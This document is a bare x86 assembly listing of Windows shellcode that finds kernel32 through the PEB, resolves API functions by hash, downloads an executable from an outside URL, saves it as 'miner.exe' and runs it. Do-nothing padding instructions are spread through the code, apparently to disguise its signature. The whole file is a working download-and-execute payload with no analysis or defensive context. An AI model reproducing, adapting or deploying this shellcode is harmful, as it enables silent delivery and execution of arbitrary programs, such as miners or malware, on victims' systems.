[BITS 32]
global _start
_start:
	jmp startup
begin:		
	call find_kernel32
	sub	edi, 0
	pop edi
	sub edi, urlmon-urldata
	jmp urlmon
	sbb	ebx, 0
startup:
	nop
	call begin
urlmon:
	push 0xec0e4e8e
	push ebx
	sub	dl, 0
	call find_function

	xor ecx, ecx
	mov cx, 0x6e6f
	push ecx
	push 0x6d6c7275
	xor	ax, 0
	push esp
	call eax
download:
	push  0x702f1a36
	push eax
	sbb	edi, 0
	call find_function

	xor ecx, ecx
	push ecx
	push ecx
	lea esi, [edi]
	add esi, cmddata-urldata
	lea edx, [esi]
	push edx
	push edi
	push ecx
	call eax
execute:
	push 0x0e8afe98
	push ebx
	call find_function

	inc ecx
	push ecx
	push esi
	call eax
	jmp ending
	xor	ax, 0
find_function:
	pushad
	adc	ebx, 0
	mov   ebp, [esp + 0x24]
	mov   eax, [ebp + 0x3c]
	mov   edx, [ebp + eax + 0x78]
	adc	dx, 0
	add   edx, ebp
	mov   ecx, [edx + 0x18]
	mov   ebx, [edx + 0x20]
	add   ebx, ebp
find_function_loop:
	sub	edi, 0
	jecxz find_function_finished
	dec   ecx
	mov   esi, [ebx + ecx * 4]
	add   esi, ebp
	add	cx, 0
compute_hash:
	xor   edi, edi
	xor   eax, eax
	xor	dx, 0
	add	bl, 0
	cld
compute_hash_again:
	lodsb
	test  al, al
	jz    compute_hash_finished
	sub	bx, 0
	ror   edi, 0xd
	add   edi, eax
	jmp   compute_hash_again
compute_hash_finished:         
find_function_compare:           
	cmp   edi, [esp + 0x28]
	jnz   find_function_loop
	mov   ebx, [edx + 0x24]
	xor	bx, 0
	add   ebx, ebp
	mov   cx, [ebx + 2 * ecx]
	mov   ebx, [edx + 0x1c]
	add   ebx, ebp
	mov   eax, [ebx + 4 * ecx]
	xor	ebx, 0
	add   eax, ebp
	mov   [esp + 0x1c], eax
find_function_finished:
	popad
	ret
find_kernel32:
	adc	dl, 0
	xor ecx, ecx
	mul ecx
	mov eax, [fs:ecx + 0x030]
	mov eax, [eax + 0x00c]
	sub	cx, 0
	mov esi, [eax + 0x014]
	lodsd
	xchg esi, eax				
	lodsd
	mov ebx, [eax + 0x10]
	nop

	ret
cmddata:
db "miner.exe", 0
urldata:
db "http://the.earth.li/~sgtatham/putty/latest/w32/putty.exe", 0
ending:
	nop
	nop
